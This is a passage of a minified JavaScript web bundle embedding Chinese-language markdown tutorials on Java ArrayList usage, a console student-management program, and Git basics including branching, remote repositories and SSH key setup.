返回值类型：String\r\n            参数：int[] arr\r\n     */\r\n    public static String arrayToString(int[] arr) {\r\n        //在方法中用 StringBuilder 按照要求进行拼接，并把结果转成 String 返回\r\n        StringBuilder sb = new StringBuilder();\r\n\r\n        sb.append("[");\r\n\r\n        for(int i=0; i<arr.length; i++) {\r\n            if(i == arr.length-1) {\r\n                sb.append(arr[i]);\r\n            } else {\r\n                sb.append(arr[i]).append(", ");\r\n            }\r\n        }\r\n\r\n        sb.append("]");\r\n\r\n        String s = sb.toString();\r\n\r\n        return  s;\r\n    }\r\n}\r\n```\r\n\r\n',P={data:function(){return{MainComponent:D}}},N=P,q=Object(u["a"])(N,A,I,!1,null,"8651277e",null),H=q.exports,B=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},F=[],U='## 1.ArrayList\r\n\r\n**集合和数组的区别 :** \r\n\r\n​\t共同点：都是存储数据的容器\r\n\r\n​\t不同点：数组的容量是固定的，集合的容量是可变的\r\n\r\n### 1.1 -ArrayList的构造方法和添加方法\r\n\r\n| public ArrayList()                   | 创建一个空的集合对象               |\r\n| ------------------------------------ | ---------------------------------- |\r\n| public boolean add(E e)              | 将指定的元素追加到此集合的末尾     |\r\n| public void add(int index,E element) | 在此集合中的指定位置插入指定的元素 |\r\n\r\n**ArrayList<E> ：** \r\n\r\n​\t可调整大小的数组实现 \r\n\r\n​\t<E> : 是一种特殊的数据类型，泛型。\r\n\r\n**怎么用呢 ?**\t\r\n\r\n​\t在出现E的地方我们使用引用数据类型替换即可\t\r\n\r\n​\t举例：ArrayList<String>, ArrayList<Student>\r\n\r\n### 1.2ArrayList类常用方法【应用】\r\n\r\n**成员方法 : **\r\n\r\n| public boolean remove(Object o)   | 删除指定的元素，返回删除是否成功       |\r\n| --------------------------------- | -------------------------------------- |\r\n| public E remove(int index)        | 删除指定索引处的元素，返回被删除的元素 |\r\n| public E set(int index,E element) | 修改指定索引处的元素，返回被修改的元素 |\r\n| public E get(int index)           | 返回指定索引处的元素                   |\r\n| public int size()                 | 返回集合中的元素的个数                 |\r\n\r\n**示例代码 :** \r\n\r\n```java\r\npublic class ArrayListDemo02 {\r\n    public static void main(String[] args) {\r\n        //创建集合\r\n        ArrayList<String> array = new ArrayList<String>();\r\n\r\n        //添加元素\r\n        array.add("hello");\r\n        array.add("world");\r\n        array.add("java");\r\n\r\n        //public boolean remove(Object o)：删除指定的元素，返回删除是否成功\r\n//        System.out.println(array.remove("world"));\r\n//        System.out.println(array.remove("javaee"));\r\n\r\n        //public E remove(int index)：删除指定索引处的元素，返回被删除的元素\r\n//        System.out.println(array.remove(1));\r\n\r\n        //IndexOutOfBoundsException\r\n//        System.out.println(array.remove(3));\r\n\r\n        //public E set(int index,E element)：修改指定索引处的元素，返回被修改的元素\r\n//        System.out.println(array.set(1,"javaee"));\r\n\r\n        //IndexOutOfBoundsException\r\n//        System.out.println(array.set(3,"javaee"));\r\n\r\n        //public E get(int index)：返回指定索引处的元素\r\n//        System.out.println(array.get(0));\r\n//        System.out.println(array.get(1));\r\n//        System.out.println(array.get(2));\r\n        //System.out.println(array.get(3)); //？？？？？？ 自己测试\r\n\r\n        //public int size()：返回集合中的元素的个数\r\n        System.out.println(array.size());\r\n\r\n        //输出集合\r\n        System.out.println("array:" + array);\r\n    }\r\n}\r\n```\r\n\r\n### 1.3 ArrayList存储字符串并遍历\r\n\r\n**案例需求 :** \r\n\r\n​\t创建一个存储字符串的集合，存储3个字符串元素，使用程序实现在控制台遍历该集合\r\n\r\n**实现步骤 :** \r\n\r\n \t1:创建集合对象\r\n        2:往集合中添加字符串对象\r\n        3:遍历集合，首先要能够获取到集合中的每一个元素，这个通过get(int index)方法实现\r\n        4:遍历集合，其次要能够获取到集合的长度，这个通过size()方法实现\r\n        5:遍历集合的通用格式\r\n\r\n**代码实现 :** \r\n\r\n```java\r\n/*\r\n    思路：\r\n        1:创建集合对象\r\n        2:往集合中添加字符串对象\r\n        3:遍历集合，首先要能够获取到集合中的每一个元素，这个通过get(int index)方法实现\r\n        4:遍历集合，其次要能够获取到集合的长度，这个通过size()方法实现\r\n        5:遍历集合的通用格式\r\n */\r\npublic class ArrayListTest01 {\r\n    public static void main(String[] args) {\r\n        //创建集合对象\r\n        ArrayList<String> array = new ArrayList<String>();\r\n\r\n        //往集合中添加字符串对象\r\n        array.add("刘正风");\r\n        array.add("左冷禅");\r\n        array.add("风清扬");\r\n\r\n        //遍历集合，其次要能够获取到集合的长度，这个通过size()方法实现\r\n//        System.out.println(array.size());\r\n\r\n        //遍历集合的通用格式\r\n        for(int i=0; i<array.size(); i++) {\r\n            String s = array.get(i);\r\n            System.out.println(s);\r\n        }\r\n    }\r\n}\r\n```\r\n\r\n### 1.4 ArrayList存储学生对象并遍历\r\n\r\n**案例需求 :** \r\n\r\n​\t创建一个存储学生对象的集合，存储3个学生对象，使用程序实现在控制台遍历该集合\r\n\r\n**实现步骤 : ** \r\n\r\n​\t1:定义学生类    \r\n\r\n​\t2:创建集合对象    \r\n\r\n​\t3:创建学生对象    \r\n\r\n​\t4:添加学生对象到集合中    \r\n\r\n​\t5:遍历集合，采用通用遍历格式实现\r\n\r\n**代码实现 :**\r\n\r\n```java\r\n/*\r\n    思路：\r\n        1:定义学生类\r\n        2:创建集合对象\r\n        3:创建学生对象\r\n        4:添加学生对象到集合中\r\n        5:遍历集合，采用通用遍历格式实现\r\n */\r\npublic class ArrayListTest02 {\r\n    public static void main(String[] args) {\r\n        //创建集合对象\r\n        ArrayList<Student> array = new ArrayList<>();\r\n\r\n        //创建学生对象\r\n        Student s1 = new Student("林青霞", 30);\r\n        Student s2 = new Student("风清扬", 33);\r\n        Student s3 = new Student("张曼玉", 18);\r\n\r\n        //添加学生对象到集合中\r\n        array.add(s1);\r\n        array.add(s2);\r\n        array.add(s3);\r\n\r\n        //遍历集合，采用通用遍历格式实现\r\n        for (int i = 0; i < array.size(); i++) {\r\n            Student s = array.get(i);\r\n            System.out.println(s.getName() + "," + s.getAge());\r\n        }\r\n    }\r\n}\r\n```\r\n\r\n### 1.5 键盘录入学生信息到集合\r\n\r\n**案例需求 :** \r\n\r\n​\t创建一个存储学生对象的集合，存储3个学生对象，使用程序实现在控制台遍历该集合\r\n\r\n​        学生的姓名和年龄来自于键盘录入\r\n\r\n**实现步骤 :**\r\n\r\n​\t1:定义学生类，为了键盘录入数据方便，把学生类中的成员变量都定义为String类型    \r\n\r\n​\t2:创建集合对象    \r\n\r\n​\t3:键盘录入学生对象所需要的数据    \r\n\r\n​\t4:创建学生对象，把键盘录入的数据赋值给学生对象的成员变量    \r\n\r\n​\t5:往集合中添加学生对象    \r\n\r\n​\t6:遍历集合，采用通用遍历格式实现\r\n\r\n**代码实现 :** \r\n\r\n```java\r\n/*\r\n    思路：\r\n        1:定义学生类，为了键盘录入数据方便，把学生类中的成员变量都定义为String类型\r\n        2:创建集合对象\r\n        3:键盘录入学生对象所需要的数据\r\n        4:创建学生对象，把键盘录入的数据赋值给学生对象的成员变量\r\n        5:往集合中添加学生对象\r\n        6:遍历集合，采用通用遍历格式实现\r\n */\r\npublic class ArrayListTest {\r\n    public static void main(String[] args) {\r\n        //创建集合对象\r\n        ArrayList<Student> array = new ArrayList<Student>();\r\n\r\n        //为了提高代码的复用性，我们用方法来改进程序\r\n        addStudent(array);\r\n        addStudent(array);\r\n        addStudent(array);\r\n\r\n        //遍历集合，采用通用遍历格式实现\r\n        for (int i = 0; i < array.size(); i++) {\r\n            Student s = array.get(i);\r\n            System.out.println(s.getName() + "," + s.getAge());\r\n        }\r\n    }\r\n\r\n    /*\r\n        两个明确：\r\n            返回值类型：void\r\n            参数：ArrayList<Student> array\r\n     */\r\n    public static void addStudent(ArrayList<Student> array) {\r\n        //键盘录入学生对象所需要的数据\r\n        Scanner sc = new Scanner(System.in);\r\n\r\n        System.out.println("请输入学生姓名:");\r\n        String name = sc.nextLine();\r\n\r\n        System.out.println("请输入学生年龄:");\r\n        String age = sc.nextLine();\r\n\r\n        //创建学生对象，把键盘录入的数据赋值给学生对象的成员变量\r\n        Student s = new Student();\r\n        s.setName(name);\r\n        s.setAge(age);\r\n\r\n        //往集合中添加学生对象\r\n        array.add(s);\r\n    }\r\n}\r\n```\r\n\r\n## 2. 学生管理系统\r\n\r\n### 2.1 学生管理系统实现步骤\r\n\r\n- **案例需求**\r\n\r\n  ​\t针对目前我们的所学内容，完成一个综合案例：学生管理系统！该系统主要功能如下：\r\n\r\n  ​\t添加学生：通过键盘录入学生信息，添加到集合中\r\n\r\n  ​\t删除学生：通过键盘录入要删除学生的学号，将该学生对象从集合中删除\r\n\r\n  ​\t修改学生：通过键盘录入要修改学生的学号，将该学生对象其他信息进行修改\r\n\r\n  ​\t查看学生：将集合中的学生对象信息进行展示\r\n\r\n  ​\t退出系统：结束程序\r\n\r\n- **实现步骤**\r\n\r\n  1. 定义学生类，包含以下成员变量\r\n\r\n     学生类：\tStudent成员变量：\t\r\n\r\n     ​\t学号：sid\t\r\n\r\n     ​\t姓名：name\t\r\n\r\n     ​\t年龄：age\t\r\n\r\n     ​\t生日：birthday\r\n\r\n     ​\t构造方法：\t\r\n\r\n     ​\t\t无参构造\t\r\n\r\n     ​\t\t带四个参数的构造成员方法：\t\r\n\r\n     ​\t每个成员变量对应给出get/set方法\r\n\r\n  2. 学生管理系统主界面的搭建步骤\r\n\r\n     2.1 用输出语句完成主界面的编写\r\n\r\n     2.2 用Scanner实现键盘录入数据\r\n\r\n     2.3 用switch语句完成操作的选择\r\n\r\n     2.4 用循环完成再次回到主界面\r\n\r\n  3. 学生管理系统的添加学生功能实现步骤\r\n\r\n     3.1 用键盘录入选择添加学生\r\n\r\n     3.2 定义一个方法，用于添加学生\r\n\r\n     ​\t显示提示信息，提示要输入何种信息\r\n\r\n     ​\t键盘录入学生对象所需要的数据\r\n\r\n     ​\t创建学生对象，把键盘录入的数据赋值给学生对象的成员变量\r\n\r\n     ​\t将学生对象添加到集合中（保存）\r\n\r\n     ​\t给出添加成功提示\r\n\r\n     3.3 调用方法\r\n\r\n  4. 学生管理系统的查看学生功能实现步骤\r\n\r\n     4.1 用键盘录入选择查看所有学生信息\r\n\r\n     4.2 定义一个方法，用于查看学生信息\r\n\r\n     ​\t显示表头信息\r\n\r\n     ​\t将集合中数据取出按照对应格式显示学生信息，年龄显示补充“岁”\r\n\r\n     4.3 调用方法\r\n\r\n  5. 学生管理系统的删除学生功能实现步骤\r\n\r\n     5.1 用键盘录入选择删除学生信息\r\n\r\n     5.2 定义一个方法，用于删除学生信息\r\n\r\n     ​\t显示提示信息\r\n\r\n     ​\t键盘录入要删除的学生学号\r\n\r\n     ​\t调用getIndex方法，查找该学号在集合的索引\r\n\r\n     ​\t如果索引为-1，提示信息不存在\r\n\r\n     ​\t如果索引不是-1，调用remove方法删除并提示删除成功\r\n\r\n     5.3 调用方法\r\n\r\n  6. 学生管理系统的修改学生功能实现步骤\r\n\r\n     6.1 用键盘录入选择修改学生信息\r\n\r\n     6.2 定义一个方法，用于修改学生信息\r\n\r\n     ​\t显示提示信息\r\n\r\n     ​\t键盘录入要修改的学生学号\r\n\r\n     ​\t调用getIndex方法，查找该学号在集合的索引\r\n\r\n     ​\t如果索引为-1，提示信息不存在\r\n\r\n     ​\t如果索引不是-1，键盘录入要修改的学生信息\r\n\r\n     ​\t集合修改对应的学生信息\r\n\r\n     ​\t给出修改成功提示\r\n\r\n     6.3 调用方法\r\n\r\n  7. 退出系统\r\n\r\n     使用System.exit(0);退出JVM\r\n\r\n### 2.2 学生类的定义\r\n\r\n```java\r\npackage com.itheima.domain;\r\n\r\npublic class Student {\r\n    private String sid; // 学号\r\n    private String name; // 姓名\r\n    private int age; // 年龄\r\n    private String birthday; // 生日\r\n\r\n    public Student() {\r\n    }\r\n\r\n    public Student(String sid, String name, int age, String birthday) {\r\n        this.sid = sid;\r\n        this.name = name;\r\n        this.age = age;\r\n        this.birthday = birthday;\r\n    }\r\n\r\n    public String getSid() {\r\n        return sid;\r\n    }\r\n\r\n    public void setSid(String sid) {\r\n        this.sid = sid;\r\n    }\r\n\r\n    public String getName() {\r\n        return name;\r\n    }\r\n\r\n    public void setName(String name) {\r\n        this.name = name;\r\n    }\r\n\r\n    public int getAge() {\r\n        return age;\r\n    }\r\n\r\n    public void setAge(int age) {\r\n        this.age = age;\r\n    }\r\n\r\n    public String getBirthday() {\r\n        return birthday;\r\n    }\r\n\r\n    public void setBirthday(String birthday) {\r\n        this.birthday = birthday;\r\n    }\r\n}\r\n```\r\n\r\n### 2.3 测试类的定义\r\n\r\n```java\r\npackage com.itheima.test;\r\n\r\nimport com.itheima.domain.Student;\r\n\r\nimport java.util.ArrayList;\r\nimport java.util.Scanner;\r\n\r\npublic class StudentManager {\r\n    public static void main(String[] args) {\r\n\r\n        Scanner sc = new Scanner(System.in);\r\n\r\n        // 创建集合容器对象\r\n        ArrayList<Student> list = new ArrayList<>();\r\n\r\n        lo:\r\n        while (true) {\r\n            // 1. 搭建主界面菜单\r\n            System.out.println("--------欢迎来到学生管理系统--------");\r\n            System.out.println("1 添加学生");\r\n            System.out.println("2 删除学生");\r\n            System.out.println("3 修改学生");\r\n            System.out.println("4 查看学生");\r\n            System.out.println("5 退出");\r\n            System.out.println("请输入您的选择:");\r\n\r\n            String choice = sc.next();\r\n\r\n            switch (choice) {\r\n                case "1":\r\n                    //System.out.println("添加学生");\r\n                    addStudent(list);\r\n                    break;\r\n                case "2":\r\n                    //System.out.println("删除学生");\r\n                    deleteStudent(list);\r\n                    break;\r\n                case "3":\r\n                    //System.out.println("修改学生");\r\n                    updateStudent(list);\r\n                    break;\r\n                case "4":\r\n                    // System.out.println("查看学生");\r\n                    queryStudents(list);\r\n                    break;\r\n                case "5":\r\n                    System.out.println("感谢您的使用");\r\n                    break lo;\r\n                default:\r\n                    System.out.println("您的输入有误");\r\n                    break;\r\n            }\r\n        }\r\n\r\n\r\n    }\r\n\r\n    // 修改学生的方法\r\n    public static void updateStudent(ArrayList<Student> list) {\r\n        System.out.println("请输入您要修改的学生学号:");\r\n        Scanner sc = new Scanner(System.in);\r\n        String updateSid = sc.next();\r\n        // 3. 调用getIndex方法, 查找该学号在集合中出现的索引位置\r\n        int index = getIndex(list,updateSid);\r\n        // 4. 根据索引判断, 学号在集合中是否存在\r\n        if(index == -1){\r\n            // 不存在: 给出提示\r\n            System.out.println("查无信息, 请重新输入");\r\n        }else{\r\n            // 存在: 接收新的学生信息\r\n            System.out.println("请输入新的学生姓名:");\r\n            String name = sc.next();\r\n            System.out.println("请输入新的学生年龄:");\r\n            int age = sc.nextInt();\r\n            System.out.println("请输入新的学生生日:");\r\n            String birthday = sc.next();\r\n            // 封装为新的学生对象\r\n            Student stu = new Student(updateSid, name, age, birthday);\r\n            // 调用集合的set方法, 完成修改\r\n            list.set(index, stu);\r\n            System.out.println("修改成功!");\r\n        }\r\n    }\r\n\r\n    // 删除学生的方法\r\n    public static void deleteStudent(ArrayList<Student> list) {\r\n        // 1. 给出提示信息 (请输入您要删除的学号)\r\n        System.out.println("请输入您要删除的学生学号:");\r\n        // 2. 键盘接收要删除的学号\r\n        Scanner sc = new Scanner(System.in);\r\n        String deleteSid = sc.next();\r\n        // 3. 调用getIndex方法, 查找该学号在集合中出现的索引位置\r\n        int index = getIndex(list,deleteSid);\r\n        // 4. 根据索引判断, 学号在集合中是否存在\r\n        if(index == -1){\r\n            // 不存在: 给出提示\r\n            System.out.println("查无信息, 请重新输入");\r\n        }else{\r\n            // 存在:删除\r\n            list.remove(index);\r\n            System.out.println("删除成功!");\r\n        }\r\n    }\r\n\r\n    // 查看学生的方法\r\n    public static void queryStudents(ArrayList<Student> list) {\r\n        // 1. 判断集合中是否存在数据, 如果不存在直接给出提示\r\n        if(list.size() == 0){\r\n            System.out.println("无信息, 请添加后重新查询");\r\n            return;\r\n        }\r\n        // 2. 存在: 展示表头数据\r\n        System.out.println("学号\\t\\t姓名\\t年龄\\t生日");\r\n        // 3. 遍历集合, 获取每一个学生对象的信息, 打印在控制台\r\n        for (int i = 0; i < list.size(); i++) {\r\n            Student stu = list.get(i);\r\n            System.out.println(stu.getSid() + "\\t" + stu.getName() + "\\t" + stu.getAge() + "\\t\\t" + stu.getBirthday());\r\n        }\r\n    }\r\n\r\n    // 添加学生的方法\r\n    public static void addStudent(ArrayList<Student> list) {\r\n        Scanner sc = new Scanner(System.in);\r\n        // 1. 给出录入的提示信息\r\n\r\n        String sid;\r\n\r\n        while(true){\r\n            System.out.println("请输入学号:");\r\n            sid = sc.next();\r\n\r\n            int index = getIndex(list, sid);\r\n\r\n            if(index == -1){\r\n                // sid不存在, 学号可以使用\r\n                break;\r\n            }\r\n        }\r\n\r\n        System.out.println("请输入姓名:");\r\n        String name = sc.next();\r\n        System.out.println("请输入年龄:");\r\n        int age = sc.nextInt();\r\n        System.out.println("请输入生日:");\r\n        String birthday = sc.next();\r\n        // 2. 将键盘录入的信息封装为学生对象\r\n        Student stu = new Student(sid,name,age,birthday);\r\n        // 3. 将封装好的学生对象, 添加到集合容器当中\r\n        list.add(stu);\r\n        // 4. 给出添加成功的提示信息\r\n        System.out.println("添加成功!");\r\n    }\r\n\r\n    /*\r\n        getIndex : 接收一个集合对象, 接收一个学生学号\r\n\r\n        查找这个学号, 在集合中出现的索引位置\r\n     */\r\n    public static int getIndex(ArrayList<Student> list, String sid){\r\n        // 1. 假设传入的学号, 在集合中不存在\r\n        int index = -1;\r\n        // 2. 遍历集合, 获取每一个学生对象, 准备进行查找\r\n        for (int i = 0; i < list.size(); i++) {\r\n            Student stu = list.get(i);\r\n            // 3. 获取每一个学生对象的学号\r\n            String id = stu.getSid();\r\n            // 4. 使用获取出的学生学号, 和传入的学号(查找的学号)进行比对\r\n            if(id.equals(sid)){\r\n                // 存在: 让index变量记录正确的索引位置\r\n                index = i;\r\n            }\r\n        }\r\n\r\n        return index;\r\n    }\r\n}\r\n```\r\n',J={data:function(){return{MainComponent:U}}},z=J,W=Object(u["a"])(z,B,F,!1,null,"4ecdf366",null),$=W.exports,G=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},V=[],Q="## 1.Git介绍 \n\n### 1.1版本控制(理解)\n\n无论是代码编写，还是文档编写，我们都会遇到对文档内容反复修改的情况\n\n![01_版本控制介绍](./img/java/basics/day10-Git.img/01_版本控制介绍.png)\n\n### 1.2开发中存在的问题(理解)\n\n+ 程序员小明负责的模块就要完成了，就在即将提交发布之前的一瞬间，电脑突然蓝屏，硬盘光荣下岗！\n\n几个月来的努力付之东流\n\n​\t![02_开发中的麻烦](./img/java/basics/day10-Git.img/02_开发中的麻烦.png)\n\n+ 老王需要在项目中加入一个很复杂的功能，一边尝试，一边修改代码，就这样摸索了一个星期。\n  可是这被改得面目全非的代码已经回不到从前了。\n\n  ![03_开发中的麻烦](./img/java/basics/day10-Git.img/03_开发中的麻烦.png)\n\n+ 小明和老王先后从文件服务器上下载了同一个文件\n\n  ![04_开发中的麻烦](./img/java/basics/day10-Git.img/04_开发中的麻烦.png)\n\n+ 因项目中Bug过多，导致项目进度拖延，项目经理老徐因此被骂，但不清楚Bug是手下哪一个程序员写的\n\n  ![05_开发中的麻烦](./img/java/basics/day10-Git.img/05_开发中的麻烦.png)\n\n+ 开发中要解决的问题\n\n  + 代码备份\n  + 版本控制\n  + 协同工作\n  + 责任追溯\n\n### 1.3SVN版本控制(理解)\n\nSVN是集中式版本控制系统，版本库是集中放在中央服务器的，而开发人员工作的时候，用的都是自己的电脑，\n所以首先要从中央服务器下载最新的版本，然后开发，开发完后，需要把自己开发的代码提交到中央服务器。\n\n+ 服务器单点故障\n\n  将会导致所有人员无法工作\n\n+ 而服务器硬盘损坏\n\n  这意味着，你可能失去了该项目的所有历史记录，这是毁灭性的。\n\n  ![06_svn和git的对比](./img/java/basics/day10-Git.img/06_svn和git的对比.png)\n\n### 1.4Git版本控制(理解)\n\nGit是在2005年，Linux系统的创建者Linus Torvalds,为了帮助全球的开发者，维护Linux系统内核的开发\n而开发了自己的开源分布式版本控制工具,分为两种类型的仓库：本地仓库和远程仓库。\n\n+ 每一个客户端都保存了完整的历史记录\n\n  服务器的故障，都可以通过客户端的记录得以恢复。\n\n  ![07_svn和git的对比](./img/java/basics/day10-Git.img/07_svn和git的对比.png)\n\n## 2.Git下载和安装 \n\n### 2.1Git的下载(应用)\n\n官网下载地址：https://git-scm.com/downloads\n\n![08_Git的下载](./img/java/basics/day10-Git.img/08_Git的下载.png)\n\n### 2.2Git的安装(应用)\n\n1. 双击安装包，进入安装向导界面\n\n   ![09_Git的安装01](./img/java/basics/day10-Git.img/09_Git的安装01.png)\n\n2. 指定安装目录\n\n   ![10_Git的安装02](./img/java/basics/day10-Git.img/10_Git的安装02.png)\n\n3. 一路next下一步\n\n   ![11_Git的安装03](./img/java/basics/day10-Git.img/11_Git的安装03.png)\n\n4. 等待安装\n\n   ![12_Git的安装04](./img/java/basics/day10-Git.img/12_Git的安装04.png)\n\n5. 安装完成\n\n   ![13_Git的安装05](./img/java/basics/day10-Git.img/13_Git的安装05.png)\n\n6. 安装完成后在电脑桌面（也可以是其他目录）点击右键，如果能够看到如下两个菜单则说明Git安装成功。\n\n   ![14_Git的安装06](./img/java/basics/day10-Git.img/14_Git的安装06.png)\n\n7. 运行Git命令客户端，使用git --version 命令，可以查看git版本\n\n   ![15_Git的安装07](./img/java/basics/day10-Git.img/15_Git的安装07.png)\n\n### 2.3TortoiseGit的安装(应用)\n\n1. 双击安装包，进入安装向导界面\n\n   ![16_TortiseGit的安装](./img/java/basics/day10-Git.img/16_TortiseGit的安装.png)\n\n2. 一路next下一步\n\n   ![17_TortiseGit的安装](./img/java/basics/day10-Git.img/17_TortiseGit的安装.png)\n\n3. 指定安装目录\n   ![18_TortiseGit的安装](./img/java/basics/day10-Git.img/18_TortiseGit的安装.png)\n\n4. 安装\n\n   ![19_TortiseGit的安装](./img/java/basics/day10-Git.img/19_TortiseGit的安装.png)\n\n5. 配置\n\n   ![20_TortiseGit的安装](./img/java/basics/day10-Git.img/20_TortiseGit的安装.png)\n\n   ![21_TortiseGit的安装](./img/java/basics/day10-Git.img/21_TortiseGit的安装.png)\n\n   ![22_TortiseGit的安装](./img/java/basics/day10-Git.img/22_TortiseGit的安装.png)\n\n   ![23_TortiseGit的安装](./img/java/basics/day10-Git.img/23_TortiseGit的安装.png)\n\n   ![24_TortiseGit的安装](./img/java/basics/day10-Git.img/24_TortiseGit的安装.png)\n\n   ![25_TortiseGit的安装](./img/java/basics/day10-Git.img/25_TortiseGit的安装.png)\n\n6. 安装TortoiseGit中文语言包,一路next即可\n\n![26_TortiseGit的安装](./img/java/basics/day10-Git.img/26_TortiseGit的安装.png)\n\n7. 配置TortoiseGit中文语言\n\n   ![27_TortiseGit的安装](./img/java/basics/day10-Git.img/27_TortiseGit的安装.png)\n\n   ![28_TortiseGit的安装](./img/java/basics/day10-Git.img/28_TortiseGit的安装.png)\n\n   ![29_TortiseGit的安装](./img/java/basics/day10-Git.img/29_TortiseGit的安装.png)\n\n   ![30_TortiseGit的安装](./img/java/basics/day10-Git.img/30_TortiseGit的安装.png)\n\n## 3.Git操作入门 \n\n### 3.1Git基本工作流程(理解)\n\n本地仓库\n\n![31_Git基本工作流程](./img/java/basics/day10-Git.img/31_Git基本工作流程.png)\n\n### 3.2Git命令行操作(应用)\n\n+ git常用命令\n\n  | 命令                   | 作用                         |\n  | -------------------- | -------------------------- |\n  | git init             | 初始化，创建 git 仓库              |\n  | git status           | 查看 git 状态 （文件是否进行了添加、提交操作） |\n  | git add 文件名          | 添加，将指定文件添加到暂存区             |\n  | git commit -m '提交信息' | 提交，将暂存区文件提交到历史仓库           |\n  | git log              | 查看日志（ git 提交的历史日志）         |\n\n+ 操作步骤\n\n  1. 创建工作目录、初始化本地 git 仓库\n\n     ![32_Git工作流程](./img/java/basics/day10-Git.img/32_Git工作流程.png)\n\n  2. 新建一个 test.txt 文件（暂不执行添加操作）\n\n  3. 使用 status 命令，查看状态\n\n     ![33_Git工作流程](./img/java/basics/day10-Git.img/33_Git工作流程.png)\n\n  4. 使用 add 命令添加，并查看状态\n\n     ![34_Git工作流程](./img/java/basics/day10-Git.img/34_Git工作流程.png)\n\n  5. 使用 commit 命令，提交到本地历史仓库\n\n     ![35_Git工作流程](./img/java/basics/day10-Git.img/35_Git工作流程.png)\n\n  6. 使用 log 命令，查看日志\n\n     ![36_Git工作流程](./img/java/basics/day10-Git.img/36_Git工作流程.png)\n\n  7. 修改 test.txt 文件\n\n     ![37_Git工作流程](./img/java/basics/day10-Git.img/37_Git工作流程.png)\n\n  8. 添加并提交，查看日志\n\n     ![38_Git工作流程](./img/java/basics/day10-Git.img/38_Git工作流程.png)\n\n### 3.3Git图形化工具操作(理解)\n\n1. 创建工作目录、初始化本地 git 仓库\n\n   ![39_Git工作流程](./img/java/basics/day10-Git.img/39_Git工作流程.png)\n\n   ![40_Git工作流程](./img/java/basics/day10-Git.img/40_Git工作流程.png)\n\n2. 新建一个 test.txt 文件（暂不执行添加操作）\n\n3. 选中文件右键，选择TortoiseGit，之后选择添加\n\n   ![41_Git工作流程](./img/java/basics/day10-Git.img/41_Git工作流程.png)\n\n4. 空白处右键,Git提交,提交到本地历史仓库\n\n   ![42_Git工作流程](./img/java/basics/day10-Git.img/42_Git工作流程.png)\n\n5. 空白处右键,TortoiseGit,显示日志,可以产看日志信息\n\n   ![43_Git工作流程](./img/java/basics/day10-Git.img/43_Git工作流程.png)\n\n6. 修改 test.txt 文件\n\n7. 添加并提交，查看日志\n\n## 4.Git版本管理 \n\n### 4.1历史版本切换(理解)\n\n![44_历史版本切换](./img/java/basics/day10-Git.img/44_历史版本切换.png)\n\n+ 准备动作\n\n  1. 查看 my_project 的 log 日志\n     git reflog ：可以查看所有分支的所有操作记录（包括已经被删除的 commit 记录的操作）\n  2. 增加一次新的修改记录\n\n+ 需求: 将代码切换到第二次修改的版本\n\n  指令：git reset --hard 版本唯一索引值\n\n### 4.2分支管理介绍(理解)\n\n+ 分支\n  + 由每次提交的代码，串成的一条时间线\n  + 使用分支意味着你可以把你的工作从开发主线上分离开来,以免影响开发主线\n+ 分支的使用场景\n  1. 周期较长的模块开发\n     假设你准备开发一个新功能，但是需要一个月才能完成\n     第一周写了20%的代码，突然发现原来已经写好的功能出现了一个严重的Bug\n     那现在就需要放下手中的新功能，去修复Bug\n     但这20%的代码不能舍弃，并且也担心丢失，这就需要开启一个新的版本控制。\n  2. 尝试性的模块开发\n     业务人员给我们提出了一个需求，经过我们的思考和分析\n     该需求应该可以使用技术手段进行实现。\n     但是我们还不敢确定，我们就可以去创建一个分支基于分支进行尝试性开发。\n\n\n+ 分支工作流程\n\n  + Master: 指向提交的代码版本\n\n  + Header: 指向当前所使用的的分支\n\n    ![45_分支工作流程介绍](./img/java/basics/day10-Git.img/45_分支工作流程介绍.png)\n\n### 4.3分支管理操作(应用)\n\n+ 创建和切换\n\n  创建命令：git branch 分支名\n  切换命令：git checkout 分支名\n\n+ 新分支添加文件\n\n  查看文件命令：ls\n\n  总结：不同分支之间的关系是平行的关系，不会相互影响\n\n+ 合并分支\n\n  合并命令：git merge 分支名\n\n+ 删除分支\n\n  删除命令：git branch -d 分支名\n\n+ 查看分支列表\n\n  查看命令：git branch\n\n## 5.远程仓库\n\n### 5.1远程仓库工作流程(理解)\n\n![46_远程仓库](./img/java/basics/day10-Git.img/46_远程仓库.png)\n\n### 5.2远程仓库平台介绍(理解)\n\n+ GitHub\n\n  域名：https://github.com\n  介绍：GitHub是全球最大的开源项目托管平台，俗称大型程序员社区化交友网站\n\n  ​\t    各类好玩有趣的开源项目，只有想不到，没有找不到。\n\n+ 码云\n\n  域名：https://gitee.com\n  介绍：码云是全国最大的开源项目托管平台，良心平台，速度快，提供免费私有库\n\n### 5.3码云的注册(应用)\n\n![47_码云的注册](./img/java/basics/day10-Git.img/47_码云的注册.png)\n\n![48_码云的注册](./img/java/basics/day10-Git.img/48_码云的注册.png)\n\n![49_码云的注册](./img/java/basics/day10-Git.img/49_码云的注册.png)\n\n### 5.4先有本地项目,远程为空(应用)\n\n+ 步骤\n\n  1. 创建本地仓库\n  2. 创建或修改文件，添加（add）文件到暂存区，提交（commit）到本地仓库\n  3. 创建远程仓库\n  4. 推送到远程仓库\n\n+ 创建远程仓库\n\n  ![50_创建远程仓库](./img/java/basics/day10-Git.img/50_创建远程仓库.png)\n\n  ![51_创建远程仓库](./img/java/basics/day10-Git.img/51_创建远程仓库.png)\n\n+ 生成SSH公钥\n\n  + 推送代码之前，需要先配置SSH公钥\n\n    ![52_配置SSH公钥](./img/java/basics/day10-Git.img/52_配置SSH公钥.png)\n\n  + 生成SSH公钥步骤\n\n    1. 设置Git账户\n\n       + git config user.name（查看git账户）\n       + git config user.email（查看git邮箱）\n       + git config --global user.name “账户名”（设置全局账户名）\n       + git config --global user.email “邮箱”（设置全局邮箱）\n       + cd ~/.ssh（查看是否生成过SSH公钥）\n\n       ![53_配置SSH公钥](./img/java/basics/day10-Git.img/53_配置SSH公钥.png)\n\n    2. 生成SSH公钥\n\n       + 生成命令: ssh-keygen –t rsa –C “邮箱” ( 注意：这里需要敲3次回车)\n\n       ![54_配置SSH公钥](./img/java/basics/day10-Git.img/54_配置SSH公钥.png)\n\n       + 查看命令: cat ~/.ssh/id-rsa.pub\n\n       ![55_配置SSH公钥](./img/java/basics/day10-Git.img/55_配置SSH公钥.png)\n\n    3. 设置账户公钥\n\n       ![56_配置SSH公钥](./img/java/basics/day10-Git.img/56_配置SSH公钥.png)\n\n       